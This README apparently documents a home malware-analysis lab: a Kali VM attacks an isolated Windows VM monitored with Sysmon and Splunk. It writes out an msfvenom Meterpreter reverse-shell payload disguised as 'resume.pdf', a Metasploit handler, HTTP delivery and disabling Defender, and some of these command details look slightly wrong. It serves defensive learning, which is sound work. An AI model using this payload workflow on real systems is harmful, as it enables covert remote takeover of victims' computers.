# MalwareHomeLab
Malware Analysis Home Lab

## Disclaimer

This lab was set up with extensive use of online resources and documentation. It is recommended that anyone attempting to replicate this setup should have a good understanding of the tools involved and consult trusted sources for additional guidance. Used ChatGPT to help prepare readme, HOWEVER all work stated is mine.

## Overview

This README outlines the setup and usage of a malware analysis home lab using VirtualBox, Windows, and Kali Linux virtual machines (VMs). The lab is designed to safely analyze malware in a controlled and isolated environment.

## Lab Setup

### 1. Installing VirtualBox

- **VirtualBox Installation**: Installed Oracle VirtualBox to create and manage virtual machines.

### 2. Setting Up Virtual Machines

- **Windows VM**:
  - Installed Windows on VirtualBox.
  - Installed Splunk for log analysis and Sysmon for system monitoring.

- **Kali Linux VM**:
  - Installed Kali Linux on VirtualBox for conducting penetration testing and malware analysis.

### 3. Network Configuration

- **Internal Network**: 
  - Configured an internal network between the Kali and Windows VMs to ensure the host machine is not affected by any malware activity.
  - **Windows VM IP**: 192.168.20.10
  - **Kali VM IP**: 192.168.20.11
  - **Netmask**: 255.255.255.0 (/24)

- **Connectivity Test**:
  - Ensured both VMs are communicating by successfully pinging each other.

### 4. Snapshots

- **First Snapshot**: 
  - Created after installing Splunk and Sysmon on the Windows VM.
  
- **Second Snapshot**: 
  - Created after configuring the network and verifying communication between the VMs.
 
- **Third Snapshot**:
  - Created after complete configuration of homelab.

## Malware Analysis Steps

### 1. Nmap Scan

- **Command**: Ran `nmap -A 192.168.20.10 Pn` on the Kali terminal.
  - **Purpose**: Scans the Windows VM for open ports, services, and possible vulnerabilities.
  - **Result**: Received a response from the Windows VM, confirming its readiness for further testing.

### 2. Creating Malware with msfvenom

- **msfvenom Command**: 
  - Ran `msfvenom -p windows/x64/meterpreter-reverse-tcp lhost=192.168.20.10 lport=4444 -f exe -o 'resume.pdf'` to create a malicious executable.
  - **Payload**: `windows/x64/meterpreter-reverse-tcp`
  - **LHOST**: Set to the Windows VM IP (`192.168.20.10`).
  - **LPORT**: Set to `4444`.
  - **Output**: Generated a malware file named `resume.pdf`.

### 3. Exploiting with Metasploit

- **msfconsole Command**: 
  - Launched Metasploit by running `msfconsole`.
  - **Exploit Setup**: Used `use exploit/multi/handler` and set the payload to `windows/x64/meterpreter-reverse-tcp`.
  - **LHOST**: Set to the Windows VM IP (`192.168.20.10`).

### 4. Serving the Malware

- **Python HTTP Server**:
  - Ran `python3 -m http.server 9999` to host the malware file (`resume.pdf`) on a local web server.
  - **Purpose**: Allows the Windows VM to download the malware for further analysis.

### 5. Executing and Monitoring the Malware

- **Windows Defender**: Disabled Windows Defender to allow the malware to execute without interference.
- **Malware Execution**: Accessed the malware via the browser by typing the IP address followed by `:9999` and executed it.
- **Connection Verification**:
  - Opened Command Prompt as an administrator and ran `netstat -anob`.
  - Confirmed the established connection on port 4444 with the process ID `5068`.
  - Verified the process was running in Task Manager.

## Splunk and Sysmon Configuration

### 1. Sysmon Installation and Configuration

- **Sysmon Installation**: Installed Sysmon on the Windows VM to monitor and log system activity.
- **Configuration**: Used a custom configuration file to define which events Sysmon should capture, including process creation, network connections, and file modification.

### 2. Splunk Setup

- **Splunk Installation**: Installed Splunk on the Windows VM to collect and analyze logs generated by Sysmon.
- **Data Input Configuration**:
  - Configured Splunk to ingest Sysmon logs by setting up a monitor for the Sysmon log file.
  - All events were indexed under `index = endpoint`.

### 3. Log Analysis

- **Event Monitoring**: Continuously monitored the Sysmon logs in Splunk, focusing on events like process creation, network connections, and file modifications related to the malware.
- **Dashboard Creation**: Created custom dashboards in Splunk to visualize and analyze the captured data, making it easier to track suspicious activity.

## Usage

- **Windows VM**: 
  - Use this VM to run and monitor malware using Splunk and Sysmon.
  - Test the malware created using `msfvenom` and exploit it with Metasploit.

- **Kali Linux VM**: 
  - Utilize this VM to perform network scans, create malicious payloads, and conduct further penetration testing on the Windows VM.

## Safety Considerations

- **Isolation**: The internal network setup ensures that any potential malware activity is confined to the virtual environment, protecting the host machine.
- **Snapshots**: Use snapshots to revert to a clean state if something goes wrong during the analysis.

## Future Work

- Considering adding additional tools or VMs as needed for a more comprehensive malware analysis.
